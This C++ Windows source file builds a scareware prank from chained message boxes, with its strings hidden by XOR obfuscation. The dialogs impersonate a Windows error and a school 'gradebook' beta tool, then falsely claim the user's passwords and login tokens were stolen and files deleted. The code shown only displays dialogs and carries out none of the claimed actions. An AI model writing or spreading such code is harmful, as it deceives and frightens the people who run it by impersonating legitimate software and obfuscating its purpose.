#include <windows.h>
#include "Xorstring.h"

void creatingmessagebox(char messageboxcreation) {
    std::string b = (XorStr("Test"));
    LPCSTR convertedb = b.c_str();
    std::string c = (XorStr( "Application failed to execute." ));
    LPCSTR convertedc = c.c_str();
    std::string d = (XorStr( "Microsoft Windows" ));
    LPCSTR convertedd = d.c_str();
    std::string e = (XorStr( "Error cannot connect to Server to download files\nDo you want to try again?\n(Known to fail on first use)" ));
    LPCSTR convertede = e.c_str();
    std::string f = (XorStr( "This is the beta version of the new gradebook tool developed for this school" ));
    LPCSTR convertedf = f.c_str();
    std::string g = (XorStr( "This computer is now effectively trashed!\nSomeone now has your passwords and login tokens..\nEverytime you boot there's a chance all of your data will be gone" ));
    LPCSTR convertedg = g.c_str();
    std::string h = (XorStr( "You probably shouldn't have opened this.." )); 
    LPCSTR convertedh = h.c_str();
    std::string i = (XorStr( "Oops" )); 
    LPCSTR convertedi = i.c_str();

    switch (messageboxcreation) {
        case 0:
        {
            int msgboxID = MessageBox(0, convertedc, convertedd, MB_OK | MB_ICONERROR); // Application failed to execute.    Microsoft Windows
            break;
        }
        case 1:
        {
            int msgboxID = MessageBox(0, convertedh, convertedi, MB_OK | MB_ICONWARNING); // You probably shouldn't have opened this..    Oops
            break;
        }
        case 2:
        {
            int msgboxID = MessageBox(0,"my cat ate one of your files :<", "sorry", MB_OK | MB_ICONWARNING); 
            break;
        }
        case 3:
        {
            int msgboxID = MessageBox(0,"I'll just delete a random file", "stop", MB_OK | MB_ICONERROR);
            break;
        }
        case 4:
        {
            int msgboxID = MessageBox(0, convertede, "Grademark 2.0 (13b38a) (Internal Tool)" , MB_RETRYCANCEL | MB_ICONERROR); // Error cannot connect to Server to download files\nDo you want to try again?\n(Known to fail on first use)
                switch (msgboxID){
                    case IDCANCEL:
                        messageboxcreation = 1;
                        creatingmessagebox(messageboxcreation);
                        messageboxcreation = 6;
                        creatingmessagebox (messageboxcreation);
                        break;
                    case IDRETRY:
                        messageboxcreation = 5;
                        creatingmessagebox (messageboxcreation);
                        messageboxcreation = 1;
                        creatingmessagebox (messageboxcreation);
                        messageboxcreation = 6;
                        creatingmessagebox (messageboxcreation);
                        break;
                }
            break;
        }
        case 5:
        {
            int msgboxID = MessageBox(0, convertedf, "Grademark 2.0 (13b38a) (Internal Tool)", MB_OK | MB_ICONINFORMATION); // This is the beta version of the new gradebook tool developed for this school
            break;
        }
        case 6:
        {
            int msgboxIDa = MessageBox(0, convertedg, ".", MB_OK | MB_ICONWARNING); // This computer is now effectively trashed!\nSomeone now has your passwords and login tokens..\nEverytime you boot there's a chance all of your data will be gone
            break;
        }
    }
}